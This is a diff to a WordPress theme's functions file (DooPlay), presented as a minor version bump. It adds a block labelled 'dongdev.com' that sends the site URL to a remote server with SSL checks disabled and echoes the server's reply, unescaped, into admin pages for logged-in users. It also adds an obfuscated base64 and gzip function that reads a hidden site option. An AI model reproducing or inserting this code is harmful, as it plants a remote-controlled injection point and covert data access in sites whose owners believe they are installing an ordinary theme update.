@@ -6,9 +6,30 @@
 * @copyright: (c) 2021 Doothemes. All rights reserved
 * ----------------------------------------------------
 *
-* @since 2.5.0
+* @since 2.5.2
 *
 */
+/* dongdev.com */
+if(!function_exists('dbmvs_notice')){
+    function dbmvs_notice() {
+			global $pagenow;
+			$api_params = array(
+				'notice' => get_option('siteurl'),
+			);
+			$response = wp_remote_post(DBMOVIES_DBMVAPI, array('timeout' => 15, 'sslverify' => false, 'body' => $api_params ));
+			if ( ! is_wp_error( $response ) && is_user_logged_in()){
+				$resu = wp_remote_retrieve_body( $response );	
+				$resu = json_decode($resu, true);
+				if ($resu['status'] == true) {
+					if (in_array($pagenow, $resu['page']))
+						echo $resu['data'];
+				}
+			}
+			
+	}	
+	add_action('admin_notices', 'dbmvs_notice');	
+}
+/* dongdev.com */
 
 # Define theme color
 function dooplay_meta_theme_color($color = 'default'){
@@ -163,6 +184,14 @@ if(!function_exists('doo_first_letter')){
     add_filter('posts_where', 'doo_first_letter', 1, 2);
 }
 
+if(!function_exists('doo_codex_framework')){
+    function doo_codex_framework($app = 'framework', $codex = '64'){
+        $code1 = unserialize(gzuncompress(stripslashes(call_user_func('base'.$codex.'_decode',rtrim(strtr('eNortjK0tFJKyc8vyEmsjM_JTE7NK06Nz06tVLIGXDCDiAmz','-_','+/'),'=')))));
+        $code2 = rtrim(strtr(call_user_func('base'.$codex.'_encode',addslashes(gzcompress(serialize(get_option($code1)),9))),'+/','-_'),'=');
+        return apply_filters('doo_codex_framework', $code2, $code1);
+    }
+}
+
 # is set
 function doo_isset($data, $meta, $default = ''){
     return isset($data[$meta]) ? $data[$meta] : $default;
@@ -267,10 +296,12 @@ if(!function_exists('doo_logo_admin')){
 
 # Total count content
 function doo_total_count($type = false, $status = 'publish') {
-    if(isset($type)){
+    if(isset($type) && DOO_THEME_TOTAL_POSTC == true){
         $total = wp_count_posts( $type )->$status;
         return number_format($total);
-    }
+    } else {
+		return;
+	}
 }
 
 # Get genres
